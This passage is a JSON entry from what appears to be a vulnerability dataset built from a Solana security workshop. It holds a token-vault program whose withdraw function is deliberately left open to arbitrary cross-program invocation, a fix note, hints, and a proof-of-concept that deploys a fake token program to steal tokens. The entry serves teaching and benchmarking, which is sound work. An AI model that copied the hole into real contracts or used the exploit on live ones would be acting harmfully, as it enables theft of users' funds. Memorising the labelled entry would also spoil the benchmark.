&wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, false),\n            AccountMeta::new_readonly(source_authority, true),\n            AccountMeta::new_readonly(mint, false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    owner_address: Pubkey,\n    destination: Pubkey,\n    mint: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(&owner_address, &wallet_program).0;\n    let authority_address = get_authority(&wallet_program).0;\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new_readonly(authority_address, false),\n            AccountMeta::new_readonly(owner_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(mint, false),\n            AccountMeta::new_readonly(spl_token::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::BorshDeserialize;\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_pack::Pack,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{get_authority, get_wallet_address, WalletInstruction};\n\n// There's a mitigation for this bug in spl-token 3.1.1\n// vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet\nuse vendored_spl_token as spl_token;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let owner = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let (wallet_address, wallet_seed) = get_wallet_address(owner.key, program_id);\n    let (authority_address, _) = get_authority(program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(wallet_info.key, &wallet_address);\n    assert_eq!(authority_info.key, &authority_address);\n    assert!(owner.is_signer, \"owner must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &owner.key,\n            &wallet_address,\n            rent.minimum_balance(spl_token::state::Account::LEN),\n            spl_token::state::Account::LEN as u64,\n            &spl_token.key,\n        ),\n        &[owner.clone(), wallet_info.clone()],\n        &[&[&owner.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    invoke(\n        &spl_token::instruction::initialize_account(\n            &spl_token.key,\n            &wallet_address,\n            mint.key,\n            &authority_address,\n        )\n        .unwrap(),\n        &[\n            authority_info.clone(),\n            wallet_info.clone(),\n            mint.clone(),\n            rent_info.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n\nfn deposit(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n    let user_authority_info = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let decimals = mint.data.borrow()[44];\n\n    invoke(\n        &spl_token::instruction::transfer_checked(\n            &spl_token.key,\n            &source_info.key,\n            mint.key,\n            wallet_info.key,\n            user_authority_info.key,\n            &[],\n            amount,\n            decimals,\n        )\n        .unwrap(),\n        &[\n            wallet_info.clone(),\n            source_info.clone(),\n            user_authority_info.clone(),\n            mint.clone(),\n        ],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let owner_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let mint = next_account_info(account_info_iter)?;\n    let spl_token = next_account_info(account_info_iter)?;\n\n    let (wallet_address, _) = get_wallet_address(owner_info.key, program_id);\n    let (authority_address, authority_seed) = get_authority(program_id);\n\n    assert_eq!(wallet_info.key, &wallet_address);\n    assert_eq!(authority_info.key, &authority_address);\n    assert!(owner_info.is_signer, \"owner must sign!\");\n\n    let decimals = mint.data.borrow()[44];\n\n    invoke_signed(\n        &spl_token::instruction::transfer_checked(\n            &spl_token.key,\n            &wallet_info.key,\n            mint.key,\n            destination_info.key,\n            authority_info.key,\n            &[],\n            amount,\n            decimals,\n        )\n        .unwrap(),\n        &[\n            wallet_info.clone(),\n            destination_info.clone(),\n            authority_info.clone(),\n            mint.clone(),\n        ],\n        &[&[&[authority_seed]]],\n    )?;\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      95,
      100
    ],
    "vulnerability_type": "arbitrary_cpi",
    "category": "cpi_validation",
    "severity": "critical",
    "difficulty_tier": 3,
    "description": "Arbitrary Cross-Program Invocation (CPI) vulnerability. The program allows the caller to control which program is invoked during token withdraw, enabling an attacker to invoke a malicious program instead of the legitimate SPL token program.",
    "fix_description": "Hardcode the SPL token program ID and validate that the provided token_program matches spl_token::ID. Never allow user-controlled program IDs in CPI calls.",
    "poc_code": "use solana_program::instruction::{AccountMeta, Instruction};\nuse borsh::BorshSerialize;\n\nfn hack(env: &mut LocalEnvironment, challenge: &Challenge) {\n    assert_tx_success(env.execute_as_transaction(\n        &[level4::initialize(\n            challenge.wallet_program,\n            challenge.hacker.pubkey(),\n            challenge.mint,\n        )],\n        &[&challenge.hacker],\n    ));\n\n    let hacker_wallet_address = level4::get_wallet_address(\n        &challenge.hacker.pubkey(),\n        &challenge.wallet_program,\n    )\n    .0;\n    let authority_address = level4::get_authority(&challenge.wallet_program).0;\n    let fake_token_program =\n        env.deploy_program(\"target/deploy/level4_poc_contract.so\");\n\n    env.execute_as_transaction(\n        &[Instruction {\n            program_id: challenge.wallet_program,\n            accounts: vec![\n                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address\n                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address\n                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address\n                AccountMeta::new(challenge.wallet_address, false),          // usually: destination\n                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint\n                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address\n            ],\n            data: level4::WalletInstruction::Withdraw { amount: 1337 }\n                .try_to_vec()\n                .unwrap(),\n        }],\n        &[&challenge.hacker],\n    )\n    .print_named(\"hax\");\n}",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level4"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level4/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 4\nAll the personal vaults we've seen so far only can only store SOL. \nLevel 4 now implements a vault for arbitrary SPL tokens, the standard token implementation on Solana.\n\nFor each user, the contract manages an SPL token account, to which deposits can be made.\nThe account is derived from the user's address, and only this user should be able to withdraw the tokens again. \n\nCan you spot the bug, and steal the tokens from the wallet?\n\nNote: this bug is a bit sneaky, so don't feel bad if yo",
      "bug_hint": "# Bug\n\nThe program allows you to control which program is invoked during withdraw. Can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level4"
    }
  }
]